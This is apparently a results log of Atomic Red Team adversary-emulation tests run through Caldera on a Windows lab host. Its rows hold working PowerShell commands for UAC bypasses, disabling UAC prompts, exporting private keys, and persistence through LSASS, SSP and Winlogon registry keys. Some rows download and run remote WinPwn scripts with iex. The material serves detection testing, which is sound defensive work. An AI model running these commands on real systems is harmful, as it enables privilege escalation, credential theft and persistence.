'T1553.004'}]",['windows'],['psh']
171,Initial-Success,credential-access,credential-access :: Unsecured Credentials: Private Keys,credential-access :: ['CertUtil ExportPFX'],credential-access :: T1552.004,operation__atomic_windows_depfalse_pshtrue__t1552_004__credential-access__unsecured_credentials-_private_keys__f7257d271a176f7c609b4a33513d2eef__SAVED_2024-03-09_000751,atomic_windows_depfalse_pshtrue__t1552_004__credential-access__unsecured_credentials-_private_keys__f7257d271a176f7c609b4a33513d2eef,['f7257d271a176f7c609b4a33513d2eef'],1,0,1,[1],['    Directory: C:\\Users\\puma-4\\AppData\\Local\\TempMode                 LastWriteTime         Length Name                                                                 ----                 -------------         ------ ----                                                                 -a----          3/9/2024  12:05 AM           2661 atomicredteam.pfx                                                    '],[''],['0'],"['$mypwd = ConvertTo-SecureString -String ""AtomicRedTeam"" -Force -AsPlainText; $cert = New-SelfSignedCertificate -DnsName atomicredteam.com -CertStoreLocation cert:\\LocalMachine\\My; Set-Location Cert:\\LocalMachine\\My; Get-ChildItem -Path $cert.Thumbprint | Export-PfxCertificate -FilePath $env:Temp\\atomicredteam.pfx -Password $mypwd']","['Creates a Root certificate and exports it with Export-PFXCertificate PowerShell Cmdlet.\nUpon a successful attempt, this will write a pfx to disk and utilize the Cmdlet Export-PFXCertificate.\n']",['Export Root Certificate with Export-PFXCertificate'],"[{'tactic': 'credential-access', 'technique_name': 'Unsecured Credentials: Private Keys', 'technique_id': 'T1552.004'}]",['windows'],['psh']
173,Initial-Success,credential-access,credential-access :: Unsecured Credentials: Private Keys,credential-access :: ['ADFS token signing and encryption certificates theft - Local'],credential-access :: T1552.004,operation__atomic_windows_depfalse_pshtrue__t1552_004__credential-access__unsecured_credentials-_private_keys__995eb25ee0b9d036110318311ca2527b__SAVED_2024-03-09_000109,atomic_windows_depfalse_pshtrue__t1552_004__credential-access__unsecured_credentials-_private_keys__995eb25ee0b9d036110318311ca2527b,['995eb25ee0b9d036110318311ca2527b'],1,0,1,[1],['    Directory: C:\\Users\\puma-4\\AppData\\Local\\TempMode                 LastWriteTime         Length Name                                                                 ----                 -------------         ------ ----                                                                 -a----          3/8/2024  11:58 PM            820 AtomicRedTeam.cer                                                    '],[''],['0'],['$cert = New-SelfSignedCertificate -DnsName atomicredteam.com -CertStoreLocation cert:\\LocalMachine\\My; Set-Location Cert:\\LocalMachine\\My; Export-Certificate -Type CERT -Cert  Cert:\\LocalMachine\\My\\$($cert.Thumbprint) -FilePath $env:Temp\\AtomicRedTeam.cer'],"['Creates a Root certificate and exports it with Export-Certificate PowerShell Cmdlet.\nUpon a successful attempt, this will write a pfx to disk and utilize the Cmdlet Export-Certificate.\n']",['Export Root Certificate with Export-Certificate'],"[{'tactic': 'credential-access', 'technique_name': 'Unsecured Credentials: Private Keys', 'technique_id': 'T1552.004'}]",['windows'],['psh']
184,Initial-Success,multiple,multiple :: Abuse Elevation Control Mechanism: Bypass User Account Control,multiple :: ['Bypass UAC using sdclt DelegateExecute'],multiple :: T1548.002,operation__atomic_windows_depfalse_pshtrue__t1548_002__multiple__abuse_elevation_control_mechanism-_bypass_user_account_control__f782c9b7007a34343faec301b64e7435__SAVED_2024-03-08_222719,atomic_windows_depfalse_pshtrue__t1548_002__multiple__abuse_elevation_control_mechanism-_bypass_user_account_control__f782c9b7007a34343faec301b64e7435,['f782c9b7007a34343faec301b64e7435'],1,0,1,[1],['    Hive: HKEY_CURRENT_USER\\Software\\Classes\\Folder\\shell\\openName                           Property                                                                                ----                           --------                                                                                command                        (default) : cmd.exe /c notepad.exe                                                      DelegateExecute : PSPath          : Microsoft.PowerShell.Core\\Registry::HKEY_CURRENT_USER\\Software\\Classes\\Folder\\shell\\open\\commandPSParentPath    : Microsoft.PowerShell.Core\\Registry::HKEY_CURRENT_USER\\Software\\Classes\\Folder\\shell\\openPSChildName     : commandPSDrive         : HKCUPSProvider      : Microsoft.PowerShell.Core\\Registry'],[''],['0'],"['New-Item -Force -Path ""HKCU:\\Software\\Classes\\Folder\\shell\\open\\command"" -Value \'cmd.exe /c notepad.exe\'; New-ItemProperty -Force -Path ""HKCU:\\Software\\Classes\\Folder\\shell\\open\\command"" -Name ""DelegateExecute""; Start-Process -FilePath $env:windir\\system32\\sdclt.exe; Start-Sleep -s 3']","['Bypasses User Account Control using a fileless method, registry only.\nUpon successful execution, sdclt.exe will spawn cmd.exe to spawn notepad.exe\n[Reference - sevagas.com](http://blog.sevagas.com/?Yet-another-sdclt-UAC-bypass)\nAdapted from [MITRE ATT&CK Evals](https://github.com/mitre-attack/attack-arsenal/blob/66650cebd33b9a1e180f7b31261da1789cdceb66/adversary_emulation/APT29/CALDERA_DIY/evals/payloads/stepFourteen_bypassUAC.ps1)\n']",['Bypass UAC using sdclt DelegateExecute'],"[{'tactic': 'multiple', 'technique_name': 'Abuse Elevation Control Mechanism: Bypass User Account Control', 'technique_id': 'T1548.002'}]",['windows'],['psh']
185,Initial-Success,multiple,multiple :: Abuse Elevation Control Mechanism: Bypass User Account Control,multiple :: ['Bypass UAC using ComputerDefaults (PowerShell)'],multiple :: T1548.002,operation__atomic_windows_depfalse_pshtrue__t1548_002__multiple__abuse_elevation_control_mechanism-_bypass_user_account_control__f91d7dfb1e6fd4fa742f24927ca4af26__SAVED_2024-03-08_223401,atomic_windows_depfalse_pshtrue__t1548_002__multiple__abuse_elevation_control_mechanism-_bypass_user_account_control__f91d7dfb1e6fd4fa742f24927ca4af26,['f91d7dfb1e6fd4fa742f24927ca4af26'],1,0,1,[1],['    Hive: HKEY_CURRENT_USER\\software\\classes\\ms-settings\\shell\\openName                           Property                                                                                ----                           --------                                                                                command                                                                                                                DelegateExecute : PSPath          : Microsoft.PowerShell.Core\\Registry::HKEY_CURRENT_USER\\software\\classes\\ms-settings\\shell\\open\\commandPSParentPath    : Microsoft.PowerShell.Core\\Registry::HKEY_CURRENT_USER\\software\\classes\\ms-settings\\shell\\openPSChildName     : commandPSDrive         : HKCUPSProvider      : Microsoft.PowerShell.Core\\Registry'],[''],['0'],"['New-Item ""HKCU:\\software\\classes\\ms-settings\\shell\\open\\command"" -Force; New-ItemProperty ""HKCU:\\software\\classes\\ms-settings\\shell\\open\\command"" -Name ""DelegateExecute"" -Value """" -Force; Set-ItemProperty ""HKCU:\\software\\classes\\ms-settings\\shell\\open\\command"" -Name ""(default)"" -Value ""C:\\Windows\\System32\\cmd.exe"" -Force; Start-Process ""C:\\Windows\\System32\\ComputerDefaults.exe""']",['PowerShell code to bypass User Account Control using ComputerDefaults.exe on Windows 10\nUpon execution administrative command prompt should open\n'],['Bypass UAC using ComputerDefaults (PowerShell)'],"[{'tactic': 'multiple', 'technique_name': 'Abuse Elevation Control Mechanism: Bypass User Account Control', 'technique_id': 'T1548.002'}]",['windows'],['psh']
186,Initial-Success,multiple,multiple :: Abuse Elevation Control Mechanism: Bypass User Account Control,multiple :: ['WinPwn - UAC Bypass DiskCleanup technique'],multiple :: T1548.002,operation__atomic_windows_depfalse_pshtrue__t1548_002__multiple__abuse_elevation_control_mechanism-_bypass_user_account_control__f27b37f253617c39ac010d2ee1238b7e__SAVED_2024-03-08_222040,atomic_windows_depfalse_pshtrue__t1548_002__multiple__abuse_elevation_control_mechanism-_bypass_user_account_control__f27b37f253617c39ac010d2ee1238b7e,['f27b37f253617c39ac010d2ee1238b7e'],1,0,1,[1],"[""Creating/Checking Log Folders in  C:\\Users\\puma-4\\Desktop directory:    Directory: C:\\Users\\puma-4\\DesktopMode                 LastWriteTime         Length Name                                                                 ----                 -------------         ------ ----                                                                 d-----          3/8/2024  10:18 PM                LocalRecon                                                           d-----          3/8/2024  10:18 PM                DomainRecon                                                              Directory: C:\\Users\\puma-4\\Desktop\\DomainReconMode                 LastWriteTime         Length Name                                                                 ----                 -------------         ------ ----                                                                 d-----          3/8/2024  10:18 PM                ADrecon                                                                  Directory: C:\\Users\\puma-4\\DesktopMode                 LastWriteTime         Length Name                                                                 ----                 -------------         ------ ----                                                                 d-----          3/8/2024  10:18 PM                LocalPrivEsc                                                         d-----          3/8/2024  10:18 PM                Exploitation                                                         d-----          3/8/2024  10:18 PM                Vulnerabilities                                                                   __        ___       ____                 \\ \\      / (_)_ __ |  _ \\__      ___ __   \\ \\ /\\ / /| | '_ \\| |_) \\ \\ /\\ / | '_ \\   \\ V  V / | | | | |  __/ \\ V  V /| | | |   \\_/\\_/  |_|_| |_|_|     \\_/\\_/ |_| |_|   --> UAC Bypass""]",[''],['0'],"['$S3cur3Th1sSh1t_repo=\'https://raw.githubusercontent.com/S3cur3Th1sSh1t\'; iex(new-object net.webclient).downloadstring(\'https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1\'); UACBypass -noninteractive -command ""C:\\windows\\system32\\cmd.exe"" -technique DiskCleanup']",['UAC bypass using DiskCleanup technique via function of WinPwn'],['WinPwn - UAC Bypass DiskCleanup technique'],"[{'tactic': 'multiple', 'technique_name': 'Abuse Elevation Control Mechanism: Bypass User Account Control', 'technique_id': 'T1548.002'}]",['windows'],['psh']
187,Initial-Success,multiple,multiple :: Abuse Elevation Control Mechanism: Bypass User Account Control,multiple :: ['Disable UAC admin consent prompt via ConsentPromptBehaviorAdmin registry key'],multiple :: T1548.002,operation__atomic_windows_depfalse_pshtrue__t1548_002__multiple__abuse_elevation_control_mechanism-_bypass_user_account_control__e7d20e7f0087f8a4234c1d1b7a228bb0__SAVED_2024-03-08_221400,atomic_windows_depfalse_pshtrue__t1548_002__multiple__abuse_elevation_control_mechanism-_bypass_user_account_control__e7d20e7f0087f8a4234c1d1b7a228bb0,['e7d20e7f0087f8a4234c1d1b7a228bb0'],1,1,0,[0],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],['$orgValue =(Get-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System -Name ConsentPromptBehaviorAdmin).ConsentPromptBehaviorAdmin; Set-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System -Name ConsentPromptBehaviorAdmin -Value 0 -Type Dword -Force'],"['Disable User Account Conrol (UAC) for admin by setting the registry key \nHKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\ConsentPromptBehaviorAdmin to 0.\n\n[MedusaLocker Ransomware](https://cloudsek.com/technical-analysis-of-medusalocker-ransomware/), \n[Purple Fox Rootkit](https://blogs.blackberry.com/en/2022/01/threat-thursday-purple-fox-rootkit), \n[Avaddon Ransomware](https://blogs.blackberry.com/en/2021/06/threat-thursday-avaddon-ransomware-uses-ddos-attacks-as-triple-threat)\n']",['Disable UAC admin consent prompt via ConsentPromptBehaviorAdmin registry key'],"[{'tactic': 'multiple', 'technique_name': 'Abuse Elevation Control Mechanism: Bypass User Account Control', 'technique_id': 'T1548.002'}]",['windows'],['psh']
188,Initial-Success,multiple,multiple :: Abuse Elevation Control Mechanism: Bypass User Account Control,multiple :: ['Disable UAC - Switch to the secure desktop when prompting for elevation via registry key'],multiple :: T1548.002,operation__atomic_windows_depfalse_pshtrue__t1548_002__multiple__abuse_elevation_control_mechanism-_bypass_user_account_control__c4c471259798dd6c7b0b56f716e12113__SAVED_2024-03-08_220716,atomic_windows_depfalse_pshtrue__t1548_002__multiple__abuse_elevation_control_mechanism-_bypass_user_account_control__c4c471259798dd6c7b0b56f716e12113,['c4c471259798dd6c7b0b56f716e12113'],1,1,0,[0],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],['Set-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System -Name PromptOnSecureDesktop -Value 0 -Type Dword -Force'],"['User Account Control (UAC) is a security mechanism for limiting the elevation of privileges, including administrative accounts, unless authorized. \nThis setting ensures that the elevation prompt is only used in secure desktop mode.\nDisable User Account Conrol (UAC) for secure desktop by setting the registry key HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\PromptOnSecureDesktop to 0.\n']",['Disable UAC - Switch to the secure desktop when prompting for elevation via registry key'],"[{'tactic': 'multiple', 'technique_name': 'Abuse Elevation Control Mechanism: Bypass User Account Control', 'technique_id': 'T1548.002'}]",['windows'],['psh']
189,Initial-Success,multiple,multiple :: Abuse Elevation Control Mechanism: Bypass User Account Control,multiple :: ['WinPwn - UAC Bypass DccwBypassUAC technique'],multiple :: T1548.002,operation__atomic_windows_depfalse_pshtrue__t1548_002__multiple__abuse_elevation_control_mechanism-_bypass_user_account_control__b473176c321f31824c909c73807caf92__SAVED_2024-03-08_220028,atomic_windows_depfalse_pshtrue__t1548_002__multiple__abuse_elevation_control_mechanism-_bypass_user_account_control__b473176c321f31824c909c73807caf92,['b473176c321f31824c909c73807caf92'],1,1,0,[0],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],"[""iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/dccuac.ps1')""]",['UAC Bypass DccwBypassUAC technique via function of WinPwn'],['WinPwn - UAC Bypass DccwBypassUAC technique'],"[{'tactic': 'multiple', 'technique_name': 'Abuse Elevation Control Mechanism: Bypass User Account Control', 'technique_id': 'T1548.002'}]",['windows'],['psh']
190,Initial-Success,multiple,multiple :: Abuse Elevation Control Mechanism: Bypass User Account Control,multiple :: ['UAC Bypass with WSReset Registry Modification'],multiple :: T1548.002,operation__atomic_windows_depfalse_pshtrue__t1548_002__multiple__abuse_elevation_control_mechanism-_bypass_user_account_control__64430e7597668877a832b9d1e379c9f2__SAVED_2024-03-08_214025,atomic_windows_depfalse_pshtrue__t1548_002__multiple__abuse_elevation_control_mechanism-_bypass_user_account_control__64430e7597668877a832b9d1e379c9f2,['64430e7597668877a832b9d1e379c9f2'],1,1,0,[0],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],"['New-Item HKCU:\\Software\\Classes\\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\\Shell\\open\\command -Force | Out-Null; New-ItemProperty -Path HKCU:\\Software\\Classes\\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\\Shell\\open\\command -Name ""DelegateExecute"" -Value """" -Force | Out-Null; Set-ItemProperty -Path HKCU:\\Software\\Classes\\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\\Shell\\open\\command -Name ""(default)"" -Value ""C:\\Windows\\System32\\cmd.exe /c start cmd.exe"" -Force -ErrorAction SilentlyContinue | Out-Null; $Process = Start-Process -FilePath ""C:\\Windows\\System32\\WSReset.exe"" -WindowStyle Hidden']","['The following UAC bypass is focused on a registry key under ""HKCU:\\Software\\Classes\\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\\Shell\\open\\command"" that will trigger a command once wsreset.exe runs. \nThis bypass is limited to Windows 10 1803/1809 and may not run on Server platforms. The registry mod is where interest will be.\nIf successful, the command to run will spawn off wsreset.exe. \n[UAC Bypass in Windows 10 Store Binary](https://0x1.gitlab.io/exploit/UAC-Bypass-in-Windows-10-Store-Binary/)\n']",['UAC Bypass with WSReset Registry Modification'],"[{'tactic': 'multiple', 'technique_name': 'Abuse Elevation Control Mechanism: Bypass User Account Control', 'technique_id': 'T1548.002'}]",['windows'],['psh']
191,Initial-Success,multiple,multiple :: Abuse Elevation Control Mechanism: Bypass User Account Control,multiple :: ['Bypass UAC using Event Viewer (PowerShell)'],multiple :: T1548.002,operation__atomic_windows_depfalse_pshtrue__t1548_002__multiple__abuse_elevation_control_mechanism-_bypass_user_account_control__7440c68b83b6d728b4111d083facefec__SAVED_2024-03-08_214704,atomic_windows_depfalse_pshtrue__t1548_002__multiple__abuse_elevation_control_mechanism-_bypass_user_account_control__7440c68b83b6d728b4111d083facefec,['7440c68b83b6d728b4111d083facefec'],1,0,1,[1],['    Hive: HKEY_CURRENT_USER\\software\\classes\\mscfile\\shell\\openName                           Property                                                                                ----                           --------                                                                                command                                                                                                                '],[''],['0'],"['New-Item ""HKCU:\\software\\classes\\mscfile\\shell\\open\\command"" -Force; Set-ItemProperty ""HKCU:\\software\\classes\\mscfile\\shell\\open\\command"" -Name ""(default)"" -Value ""C:\\Windows\\System32\\cmd.exe"" -Force; Start-Process ""C:\\Windows\\System32\\eventvwr.msc""']",['PowerShell code to bypass User Account Control using Event Viewer and a relevant Windows Registry modification. More information here - https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/\nUpon execution command prompt should be launched with administrative privalages\n'],['Bypass UAC using Event Viewer (PowerShell)'],"[{'tactic': 'multiple', 'technique_name': 'Abuse Elevation Control Mechanism: Bypass User Account Control', 'technique_id': 'T1548.002'}]",['windows'],['psh']
193,Initial-Success,multiple,multiple :: Abuse Elevation Control Mechanism: Bypass User Account Control,multiple :: ['Bypass UAC using Fodhelper - PowerShell'],multiple :: T1548.002,operation__atomic_windows_depfalse_pshtrue__t1548_002__multiple__abuse_elevation_control_mechanism-_bypass_user_account_control__20d68348c822d2947e5a795ac15a22b0__SAVED_2024-03-08_213346,atomic_windows_depfalse_pshtrue__t1548_002__multiple__abuse_elevation_control_mechanism-_bypass_user_account_control__20d68348c822d2947e5a795ac15a22b0,['20d68348c822d2947e5a795ac15a22b0'],1,0,1,[1],['    Hive: HKEY_CURRENT_USER\\software\\classes\\ms-settings\\shell\\openName                           Property                                                                                ----                           --------                                                                                command                                                                                                                DelegateExecute : PSPath          : Microsoft.PowerShell.Core\\Registry::HKEY_CURRENT_USER\\software\\classes\\ms-settings\\shell\\open\\commandPSParentPath    : Microsoft.PowerShell.Core\\Registry::HKEY_CURRENT_USER\\software\\classes\\ms-settings\\shell\\openPSChildName     : commandPSDrive         : HKCUPSProvider      : Microsoft.PowerShell.Core\\Registry'],[''],['0'],"['New-Item ""HKCU:\\software\\classes\\ms-settings\\shell\\open\\command"" -Force; New-ItemProperty ""HKCU:\\software\\classes\\ms-settings\\shell\\open\\command"" -Name ""DelegateExecute"" -Value """" -Force; Set-ItemProperty ""HKCU:\\software\\classes\\ms-settings\\shell\\open\\command"" -Name ""(default)"" -Value ""C:\\Windows\\System32\\cmd.exe"" -Force; Start-Process ""C:\\Windows\\System32\\fodhelper.exe""']",['PowerShell code to bypass User Account Control using the Windows 10 Features on Demand Helper (fodhelper.exe). Requires Windows 10.\nUpon execution command prompt will be opened.\n'],['Bypass UAC using Fodhelper - PowerShell'],"[{'tactic': 'multiple', 'technique_name': 'Abuse Elevation Control Mechanism: Bypass User Account Control', 'technique_id': 'T1548.002'}]",['windows'],['psh']
194,Initial-Success,multiple,multiple :: Abuse Elevation Control Mechanism: Bypass User Account Control,multiple :: ['WinPwn - UAC Bypass ccmstp technique'],multiple :: T1548.002,operation__atomic_windows_depfalse_pshtrue__t1548_002__multiple__abuse_elevation_control_mechanism-_bypass_user_account_control__1bb96a80fd7968839ead470953ffb738__SAVED_2024-03-08_212702,atomic_windows_depfalse_pshtrue__t1548_002__multiple__abuse_elevation_control_mechanism-_bypass_user_account_control__1bb96a80fd7968839ead470953ffb738,['1bb96a80fd7968839ead470953ffb738'],1,0,1,[1],"[""Creating/Checking Log Folders in  C:\\Users\\puma-4\\Desktop directory:    Directory: C:\\Users\\puma-4\\DesktopMode                 LastWriteTime         Length Name                                                                 ----                 -------------         ------ ----                                                                 d-----          3/8/2024   9:24 PM                LocalRecon                                                           d-----          3/8/2024   9:24 PM                DomainRecon                                                              Directory: C:\\Users\\puma-4\\Desktop\\DomainReconMode                 LastWriteTime         Length Name                                                                 ----                 -------------         ------ ----                                                                 d-----          3/8/2024   9:24 PM                ADrecon                                                                  Directory: C:\\Users\\puma-4\\DesktopMode                 LastWriteTime         Length Name                                                                 ----                 -------------         ------ ----                                                                 d-----          3/8/2024   9:24 PM                LocalPrivEsc                                                         d-----          3/8/2024   9:24 PM                Exploitation                                                         d-----          3/8/2024   9:24 PM                Vulnerabilities                                                                   __        ___       ____                 \\ \\      / (_)_ __ |  _ \\__      ___ __   \\ \\ /\\ / /| | '_ \\| |_) \\ \\ /\\ / | '_ \\   \\ V  V / | | | | |  __/ \\ V  V /| | | |   \\_/\\_/  |_|_| |_|_|     \\_/\\_/ |_| |_|   --> UAC BypassId      : 9136Handles : 12CPU     : 0SI      : 1Name    : cmstpFalseFalseProcess : cmstpHwnd    : 0""]",[''],['0'],"['$S3cur3Th1sSh1t_repo=\'https://raw.githubusercontent.com/S3cur3Th1sSh1t\'; iex(new-object net.webclient).downloadstring(\'https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1\'); UACBypass -noninteractive -command ""C:\\windows\\system32\\calc.exe"" -technique ccmstp']",['UAC bypass using ccmstp technique via function of WinPwn'],['WinPwn - UAC Bypass ccmstp technique'],"[{'tactic': 'multiple', 'technique_name': 'Abuse Elevation Control Mechanism: Bypass User Account Control', 'technique_id': 'T1548.002'}]",['windows'],['psh']
198,Initial-Success,multiple,multiple :: Boot or Logon Autostart Execution: Shortcut Modification,multiple :: ['Create shortcut to cmd in startup folders'],multiple :: T1547.009,operation__atomic_windows_depfalse_pshtrue__t1547_009__multiple__boot_or_logon_autostart_execution-_shortcut_modification__501af516bd8b24fee0c7c650ae5cc861__SAVED_2024-03-08_204627,atomic_windows_depfalse_pshtrue__t1547_009__multiple__boot_or_logon_autostart_execution-_shortcut_modification__501af516bd8b24fee0c7c650ae5cc861,['501af516bd8b24fee0c7c650ae5cc861'],1,1,0,[0],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],"['$Shell = New-Object -ComObject (""WScript.Shell""); $ShortCut = $Shell.CreateShortcut(""$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\T1547.009.lnk""); $ShortCut.TargetPath=""cmd.exe""; $ShortCut.WorkingDirectory = ""C:\\Windows\\System32""; $ShortCut.WindowStyle = 1; $ShortCut.Description = ""T1547.009.""; $ShortCut.Save(); $Shell = New-Object -ComObject (""WScript.Shell""); $ShortCut = $Shell.CreateShortcut(""$env:ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\T1547.009.lnk""); $ShortCut.TargetPath=""cmd.exe""; $ShortCut.WorkingDirectory = ""C:\\Windows\\System32""; $ShortCut.WindowStyle = 1; $ShortCut.Description = ""T1547.009.""; $ShortCut.Save()']","['LNK file to launch CMD placed in startup folder. Upon execution, open File Explorer and browse to ""%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\""\nto view the new shortcut.\n']",['Create shortcut to cmd in startup folders'],"[{'tactic': 'multiple', 'technique_name': 'Boot or Logon Autostart Execution: Shortcut Modification', 'technique_id': 'T1547.009'}]",['windows'],['psh']
199,Initial-Success,multiple,multiple :: Boot or Logon Autostart Execution: LSASS Driver,multiple :: ['Modify Registry to load Arbitrary DLL into LSASS - LsaDbExtPt'],multiple :: T1547.008,operation__atomic_windows_depfalse_pshtrue__t1547_008__multiple__boot_or_logon_autostart_execution-_lsass_driver__4572792b7173c41d22a827610b8f8890__SAVED_2024-03-08_203944,atomic_windows_depfalse_pshtrue__t1547_008__multiple__boot_or_logon_autostart_execution-_lsass_driver__4572792b7173c41d22a827610b8f8890,['4572792b7173c41d22a827610b8f8890'],1,0,1,[1],['LsaDbExtPt   : PathToAtomicsFolder\\..\\ExternalPayloads\\lsass_lib.dllPSPath       : Microsoft.PowerShell.Core\\Registry::HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\NTDSPSParentPath : Microsoft.PowerShell.Core\\Registry::HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\ServicesPSChildName  : NTDSPSDrive      : HKLMPSProvider   : Microsoft.PowerShell.Core\\Registry'],[''],['0'],"['New-ItemProperty -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NTDS -Name LsaDbExtPt -Value ""PathToAtomicsFolder\\..\\ExternalPayloads\\lsass_lib.dll""']","['The following Atomic will modify an undocumented registry key that may be abused to load a arbitrary DLL into LSASS. \n\nUpon execution, the registry key will be modified and a value will contain the path to the DLL. \nReference: https://blog.xpnsec.com/exploring-mimikatz-part-1/ and source https://github.com/oxfemale/LogonCredentialsSteal\nNote that if any LSA based protection is enabled, this will most likely not be successful with LSASS.exe loading the DLL.\n']",['Modify Registry to load Arbitrary DLL into LSASS - LsaDbExtPt'],"[{'tactic': 'multiple', 'technique_name': 'Boot or Logon Autostart Execution: LSASS Driver', 'technique_id': 'T1547.008'}]",['windows'],['psh']
200,Initial-Success,multiple,multiple :: Boot or Logon Autostart Execution: Kernel Modules and Extensions,multiple :: ['Snake Malware Kernel Driver Comadmin'],multiple :: T1547.006,operation__atomic_windows_depfalse_pshtrue__t1547_006__multiple__boot_or_logon_autostart_execution-_kernel_modules_and_extensions__bdd0be771e2462e572e2ecfbe5bf2eb7__SAVED_2024-03-08_203259,atomic_windows_depfalse_pshtrue__t1547_006__multiple__boot_or_logon_autostart_execution-_kernel_modules_and_extensions__bdd0be771e2462e572e2ecfbe5bf2eb7,['bdd0be771e2462e572e2ecfbe5bf2eb7'],1,1,0,[0],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],"['$examplePath = Join-Path $env:windir ""system32\\Com""; if (-not (Test-Path $examplePath)) { New-Item -ItemType Directory -Path $examplePath | Out-Null }; $exampleName = ""comadmin.dat""; $exampleFullPath = Join-Path $examplePath $exampleName; $randomBytes = New-Object Byte[] 0x1000; (New-Object Random).NextBytes($randomBytes); [System.IO.File]::WriteAllBytes($exampleFullPath, $randomBytes)']","[""The following Atomic Test will write an file, comadmin.dat, to disk. From the report, Snake's installer drops the kernel driver and a custom DLL which is used to load the driver into a\nsingle AES encrypted file on disk. Typically, this file is named ���comadmin.dat��� and is stored in the %windows%\\system32\\Com directory. \nThis Atomic Test will write a hardcoded named file to disk in the com directory named comadmin.dat.\n[Snake Malware - CISA](https://media.defense.gov/2023/May/09/2003218554/-1/-1/0/JOINT_CSA_HUNTING_RU_INTEL_SNAKE_MALWARE_20230509.PDF)  \n""]",['Snake Malware Kernel Driver Comadmin'],"[{'tactic': 'multiple', 'technique_name': 'Boot or Logon Autostart Execution: Kernel Modules and Extensions', 'technique_id': 'T1547.006'}]",['windows'],['psh']
202,Initial-Success,multiple,multiple :: Boot or Logon Autostart Execution: Security Support Provider,multiple :: ['Modify HKLM:\\System\\CurrentControlSet\\Control\\Lsa Security Support Provider configuration in registry'],multiple :: T1547.005,operation__atomic_windows_depfalse_pshtrue__t1547_005__multiple__boot_or_logon_autostart_execution-_security_support_provider__bd9f08eb7c3215b8a6a7dd1af9ea406a__SAVED_2024-03-08_201931,atomic_windows_depfalse_pshtrue__t1547_005__multiple__boot_or_logon_autostart_execution-_security_support_provider__bd9f08eb7c3215b8a6a7dd1af9ea406a,['bd9f08eb7c3215b8a6a7dd1af9ea406a'],1,1,0,[0],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],"['$oldvalue = $(Get-ItemProperty HKLM:\\System\\CurrentControlSet\\Control\\Lsa -Name \'Security Packages\' | Select-Object -ExpandProperty \'Security Packages\'); Set-ItemProperty -Path ""HKLM:\\System\\CurrentControlSet\\Control\\Lsa"" -Name \'Security Packages old\' -Value ""$oldvalue""; $newvalue = ""AtomicTest.dll""; Set-ItemProperty HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa -Name \'Security Packages\' -Value $newvalue']","['Add a value to a Windows registry Security Support Provider pointing to a payload .dll which will normally need to be copied in the system32 folder.\nA common DLL used with this techquite is the minilib.dll from mimikatz, see https://pentestlab.blog/2019/10/21/persistence-security-support-provider/\n']",['Modify HKLM:\\System\\CurrentControlSet\\Control\\Lsa Security Support Provider configuration in registry'],"[{'tactic': 'multiple', 'technique_name': 'Boot or Logon Autostart Execution: Security Support Provider', 'technique_id': 'T1547.005'}]",['windows'],['psh']
203,Initial-Success,multiple,multiple :: Boot or Logon Autostart Execution: Winlogon Helper DLL,multiple :: ['Winlogon Notify Key Logon Persistence - PowerShell'],multiple :: T1547.004,operation__atomic_windows_depfalse_pshtrue__t1547_004__multiple__boot_or_logon_autostart_execution-_winlogon_helper_dll__f7c881e0d021a2f5b45546b5d0b4998e__SAVED_2024-03-08_201247,atomic_windows_depfalse_pshtrue__t1547_004__multiple__boot_or_logon_autostart_execution-_winlogon_helper_dll__f7c881e0d021a2f5b45546b5d0b4998e,['f7c881e0d021a2f5b45546b5d0b4998e'],1,0,1,[1],['    Hive: HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\NotifyName                           Property                                                                                ----                           --------                                                                                AtomicRedTeam                                                                                                          '],[''],['0'],"['New-Item ""HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\\AtomicRedTeam"" -Force; Set-ItemProperty ""HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\\AtomicRedTeam"" ""DllName"" ""C:\\Windows\\Temp\\atomicNotificationPackage.dll"" -Type ExpandString -Force; Set-ItemProperty 